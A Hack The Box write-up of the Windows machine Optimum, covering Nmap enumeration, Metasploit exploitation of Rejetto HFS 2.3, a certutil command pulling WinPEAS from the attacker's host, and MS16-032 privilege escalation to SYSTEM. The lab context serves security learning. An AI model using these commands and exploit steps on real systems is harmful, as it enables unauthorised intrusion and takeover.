# Hack The Box - Optimum

> Windows • Easy

---

## Summary

Optimum was a Windows machine that made me focus on versioning and enumeration, it also offered me the chance to troubleshoot configurations within exploits.

The machine reinforced key concepts:

* proper enumeration
* validating assumptions
* understanding privilege escalation paths
* troubleshooting payload and architecture issues
* adapting exploitation strategy when things fail

---

# Enumeration

I started with a standard Nmap scan:

```bash
nmap -sS -sV -sC -O <target-ip>
```

The scan identified:
- Port 80 HTTP
- HttpFileServer (HFS) 2.3
- Windows Server 2012 R2 backend

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
```

## Nmap Scan

<img width="1494" height="498" alt="image" src="https://github.com/user-attachments/assets/d330b2fe-196c-49d7-b19e-9e3663e4bea8" />


At first glance the target exposed a login portal through the web interface, but instead of spending a large portion of time attempting credential attacks, I focused on the service banner and version information being exposed.

The HFS version immediately stood out as outdated software with known public vulnerabilities.

---

# Web Enumeration

Performed some basic web enumeration both manually and with `curl`.

```bash
curl http://<target-ip>
```

The response confirmed the server was running Rejetto HFS and reinforced the idea that the attack surface was likely the application itself rather than the login form.

## Curl Enumeration

<img width="1314" height="627" alt="image" src="https://github.com/user-attachments/assets/b435d0d8-9ce0-4155-b40c-bc1779c2746b" />


## Browser Enumeration

<img width="1793" height="820" alt="image" src="https://github.com/user-attachments/assets/83c04092-7b88-4a8b-b782-ab7920986142" />


At this point I stopped credential guessing and started looking at vulnerabilities tied specifically to:
- Rejetto HFS 2.3.x

---

# Initial Foothold

Used Metasploit to exploit the known remote code execution vulnerability associated with HFS 2.3.

```bash
use exploit/windows/http/rejetto_hfs_exec
```

After configuring:
- RHOSTS
- payload
- LHOST
- LPORT

I successfully obtained an initial Meterpreter session as:

```text
OPTIMUM\kostas
```

## Initial Meterpreter Session

<img width="1390" height="623" alt="image" src="https://github.com/user-attachments/assets/4c14e117-d1a3-4434-b317-c61196a16ab0" />


---

# Local Enumeration

Once initial access was established, I wanted to shift to local enumeration instead of immediately attempting privilege escalation.

Enumeration included:
- manual inspection
- WinPEAS
- Metasploit local exploit suggestion checks

I hosted WinPEAS locally using a Python HTTP server:

```bash
python3 -m http.server 9000
```

Downloaded it onto the victim using:

```cmd
certutil -urlcache -split -f http://<vpn-ip>:9000/winPEASx64.exe winpeas.exe
```

WinPEAS identified several useful findings including:
- plaintext AutoLogon credentials
- outdated Windows build
- minimal installed hotfixes
- multiple possible privilege escalation vectors

## WinPEAS Enumeration

<img width="1434" height="656" alt="image" src="https://github.com/user-attachments/assets/52b52b2d-c3ee-429a-a5fa-927ebafbb781" />


---

# Privilege Escalation Analysis

I then used Metasploit’s local exploit suggester module to search the machine:

```bash
use post/multi/recon/local_exploit_suggester
```

This returned several possible privilege escalation vectors including:
- UAC bypass techniques
- token impersonation techniques
- MS16-032 privilege escalation

```text
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

At this stage I opted to start with a known exploit rather than a newer one and or the UAC related ones. 

## Local Exploit Suggester

<img width="1447" height="550" alt="image" src="https://github.com/user-attachments/assets/e131d21b-af4c-496b-b911-f892140312c4" />


---

# Troubleshooting the Privilege Escalation

This ended up teaching me a lot because things did not initially run as planned.

Initial attempts at exploiting MS16-032 appeared successful, but no SYSTEM session was being returned.

Instead of immediately assuming the exploit path was incorrect, I started troubleshooting:
- process architecture
- payload architecture
- session stability

While reviewing running processes with Meterpreter:

```bash
ps
```

I noticed:
- the operating system itself was x64
- but the Meterpreter session was running under an x86 HFS process

That architecture mismatch was causing unstable payload callbacks.

To resolve this, I migrated the Meterpreter session into a stable x64 process:

```bash
migrate <PID>
```

Specifically into:
- `explorer.exe`

After migration, I:
- switched to an x64 payload
- explicitly set the exploit target to x64
- adjusted listener configuration
- reran the exploit

## Process Migration

<img width="855" height="390" alt="image" src="https://github.com/user-attachments/assets/03fd5e21-ba66-4a57-84a9-e99be211d7bc" />

<img width="1214" height="667" alt="image" src="https://github.com/user-attachments/assets/4e52bde5-eaff-4a55-b41e-86ecf7890a9a" />

<img width="737" height="239" alt="image" src="https://github.com/user-attachments/assets/1821a8c1-c9fc-4009-92ce-49f74d782495" />

---

# SYSTEM Access

After correcting the x86/x64 mismatch, the MS16-032 exploit executed successfully and returned a SYSTEM Meterpreter session.

```text
NT AUTHORITY\SYSTEM
```

## SYSTEM Shell

<img width="1210" height="462" alt="image" src="https://github.com/user-attachments/assets/63ab55fe-c339-4123-bfc6-a774205203d3" />


From there I navigated to the Administrator desktop and retrieved the final flag.

---

# Takeaways
- Enumeration is often more valuable than brute force attempts.
- Service/version information alone can completely change the attack path.
- Architecture mismatches can break otherwise valid exploit chains.
- Troubleshooting payloads and session behavior is normal.
